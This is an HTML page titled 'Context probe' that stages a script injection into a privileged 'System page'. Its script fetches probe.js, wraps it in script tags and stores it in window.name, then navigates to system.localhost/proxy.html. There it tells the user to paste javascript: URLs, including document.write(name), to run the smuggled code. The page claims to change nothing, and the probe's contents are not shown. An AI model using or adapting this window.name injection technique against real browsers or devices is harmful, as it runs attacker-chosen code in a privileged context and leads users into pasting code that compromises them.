<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Probe</title>
<style>
*{box-sizing:border-box}body{margin:0;background:#0b1220;color:#e2e8f0;font:15px Arial,sans-serif}
main{max-width:620px;margin:auto;padding:16px}h1{color:#38bdf8;font-size:22px}
button{width:100%;padding:13px;border:0;border-radius:7px;background:#22c55e;color:#04121a;font-weight:bold;font-size:16px}
button:disabled{opacity:.55}code{display:block;white-space:pre-wrap;word-break:break-word;padding:9px;margin:6px 0;background:#04121a;color:#22c55e;border-radius:6px}
pre{background:#121d31;border:1px solid #243049;border-radius:8px;padding:10px}
</style>
</head>
<body>
<main>
  <h1>Context probe</h1>
  <p>Reports what the injected System-page context exposes. Nothing is changed.</p>
  <button id="stage" type="button">Stage probe</button>
  <pre id="status" role="status" aria-live="polite">Ready.</pre>
  <p>Then on the blank System page, in order:</p>
  <code>javascript:document.createElement('script')</code>
  <code>javascript:document.write(name)</code>
  <p>A black screen lists the results — read them back.</p>
</main>
<script>
(function () {
  "use strict";
  var button = document.getElementById("stage");
  var status = document.getElementById("status");
  function get(path, done) {
    var r = new XMLHttpRequest();
    r.open("GET", new URL(path, location.href).href + "?v=1.0", true);
    r.onload = function () {
      if (r.status < 200 || r.status >= 300 || !r.responseText) {
        done(new Error("Could not load " + path + ": HTTP " + r.status));
      } else { done(null, r.responseText); }
    };
    r.onerror = function () { done(new Error("Could not load " + path)); };
    r.send();
  }
  button.onclick = function () {
    button.disabled = true;
    status.textContent = "Loading probe…";
    get("probe.js", function (e1, payload) {
      if (e1) { status.textContent = e1.message; button.disabled = false; return; }
      if (payload.toLowerCase().indexOf("</scr" + "ipt") !== -1) {
        status.textContent = "Cannot stage safely."; button.disabled = false; return;
      }
      window.name = "<script>" + payload + "<" + "/script>";
      if (window.name.length !== payload.length + 17) {
        status.textContent = "Did not retain full script."; button.disabled = false; return;
      }
      status.textContent = "Staged. Opening the System page…";
      location.href = "http://system.localhost/proxy.html";
    });
  };
}());
</script>
</body>
</html>
